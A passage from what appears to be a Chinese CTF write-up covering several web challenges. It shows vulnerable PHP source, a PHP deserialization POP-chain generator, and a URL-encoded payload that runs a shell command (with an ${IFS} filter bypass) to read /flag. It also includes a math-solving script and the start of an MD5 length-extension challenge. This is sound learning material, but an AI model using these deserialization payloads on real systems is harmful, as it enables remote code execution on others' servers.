<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ser<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>web<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>kw<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>re<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>chu0<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>pwn<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>dusk<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>over<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Misc<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>nothing<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>flag<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre>

<h4 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$nature</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span></code></pre>

<p>Pop链：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$word</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Nature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span><span class="token operator">-></span><span class="token property">word</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span><span class="token operator">-></span><span class="token property">word</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac\$&#123;IFS&#125;/flag');"</span><span class="token punctuation">;</span>
<span class="token variable">$tmp</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"word"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"%00Shark%00word"</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 不要忘记修改前面的数字</span>
<span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"%00Sink%00cmd"</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span></span></code></pre>

<p>Payload:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>
nature<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Nature<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>sea<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Sea<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>animal<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Shark<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Shark<span class="token operator">%</span><span class="token number">00</span>word<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Sink<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Sink<span class="token operator">%</span><span class="token number">00</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span>tac<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>BIFS<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">2</span>Fflag<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre>

<p>值得一提的是因为Shark中的word和Sink的cmd为私有变量，所以要手动改变其url编码后的结果</p>
<pre class="language-php" data-language="php"><code class="language-php">cmd <span class="token operator">--</span><span class="token operator">></span> <span class="token operator">%</span><span class="token number">00</span>Sink<span class="token operator">%</span><span class="token number">00</span>cmd  s<span class="token punctuation">:</span><span class="token number">3</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">s</span><span class="token punctuation">:</span><span class="token number">9</span></code></pre>

<h4 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h4><p>脚本题，注意除法取整而且要替换一下乘号和除号</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
<span class="token keyword">import</span> re
<span class="token keyword">import</span> ast


<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">:</span>
    node <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>expression<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'eval'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>


url <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:27436/"</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span><span class="token punctuation">,</span>
    <span class="token string">"user-agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"</span>
<span class="token punctuation">&#125;</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">"lxml"</span><span class="token punctuation">)</span>
    key_text <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\d+[+\-×÷]\d+'</span><span class="token punctuation">,</span> key_text<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
        calculation <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>calculation<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'÷'</span> <span class="token keyword">in</span> calculation<span class="token punctuation">:</span>
            calculation <span class="token operator">=</span> calculation<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'÷'</span><span class="token punctuation">,</span> <span class="token string">'//'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'×'</span> <span class="token keyword">in</span> calculation<span class="token punctuation">:</span>
            calculation <span class="token operator">=</span> calculation<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'×'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> safe_eval<span class="token punctuation">(</span>calculation<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>calculation<span class="token punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>
        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'CTF'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'BaseCTF(.*)'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre>

<h4 id="所以你说你懂-MD5-哈希长度拓展攻击"><a href="#所以你说你懂-MD5-哈希长度拓展攻击" class="headerlink" title="所以你说你懂 MD5?  (哈希长度拓展攻击)"></a>所以你说你懂 MD5?  (哈希长度拓展攻击)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 所以你说你懂 MD5 了?</span>

<span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'apple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'banana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'加强难度就不会了?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 什么? 你绕过去了?</span>
<span class="token comment">// 加大剂量!</span>
<span class="token comment">// 我要让他成为 string</span>
<span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'appple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bananana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'难吗?不难!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 你还是绕过去了?</span>
<span class="token comment">// 哦哦哦, 我少了一个等于号</span>
<span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'apppple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'banananana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'嘻嘻, 不会了? 没看直播回放?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 你以为这就结束了</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 你想看到 random 的值吗?</span>
<span class="token comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span>
<span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$random</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />'</span><span class="token punctuation">;</span>

<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>

<span class="token comment">// check if name ends with 'admin'</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'不是管理员也来凑热闹?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$md5</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$random</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token variable">$md5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'伪造? NO NO NO!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 认输了, 看样子你真的很懂 MD5</span>
<span class="token comment">// 那 flag 就给你吧</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"看样子你真的很懂 MD5"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 加强难度就不会了<span class="token operator">?</span></span></code></pre>

<p>第一层可用数组绕过</p>
